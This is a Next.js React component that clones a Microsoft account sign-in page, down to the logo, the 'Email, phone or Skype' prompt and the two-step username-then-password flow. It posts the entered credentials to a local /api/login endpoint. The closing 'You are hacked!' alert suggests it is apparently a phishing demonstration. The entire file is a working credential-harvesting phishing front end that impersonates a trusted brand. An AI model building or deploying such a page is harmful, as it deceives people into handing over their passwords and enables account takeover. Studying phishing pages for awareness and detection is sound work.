"use client";
/* eslint-disable react/no-unescaped-entities */
import { useState } from "react";
import Image from "next/image";
import bg from "./bg.jpg";
import logo from "./ms.webp";

export default function Home() {
  const [showPasswordInput, setShowPasswordInput] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleNextButtonClick = () => {
    setShowPasswordInput(true);
  };

  const handleSignInButtonClick = async () => {
    const response = await fetch("/api/login", {
      method: "POST",
      body: JSON.stringify({ username, password }),
    });
    const data = await response.json();
    if (response.status === 200) {
      alert("You are hacked!");
    }
  };

  return (
    <div
      style={{
        backgroundImage: `url(${bg.src})`,
        backgroundSize: "cover",
        height: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
      }}
    >
      <div className="h-[338px] w-[440px] bg-white border p-[44px]">
        <Image height={24} width={108} src={logo} alt="logo" />
        {showPasswordInput ? (
          <>
            <h1 className="text-2xl font-bold mt-4">Enter Password</h1>
            <input
              className="mt-4 border-b border-blue-800 pb-2 w-full"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <p className="text-sm mt-4">
              No account? <a className="text-blue-600">Create one!</a>
            </p>
            <p className="text-sm mt-4">
              <a className="text-blue-600">Can't access your account?</a>
            </p>
            <div className="grid grid-cols-6">
              <div className="col-span-4"></div>
              <button
                className="bg-blue-600 text-white mt-4 w-[108px] h-[32px] text-center"
                onClick={handleSignInButtonClick}
              >
                Sign in
              </button>
            </div>
          </>
        ) : (
          <>
            <h1 className="text-2xl font-bold mt-4">Sign in</h1>
            <input
              className="mt-4 border-b border-blue-800 pb-2 w-full"
              type="text"
              placeholder="Email, phone or Skype"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <p className="text-sm mt-4">
              No account? <a className="text-blue-600">Create one!</a>
            </p>
            <p className="text-sm mt-4">
              <a className="text-blue-600">Can't access your account?</a>
            </p>
            <div className="grid grid-cols-6">
              <div className="col-span-4"></div>
              <button
                className="bg-blue-600 text-white mt-4 w-[108px] h-[32px] text-center"
                onClick={handleNextButtonClick}
              >
                Next
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}
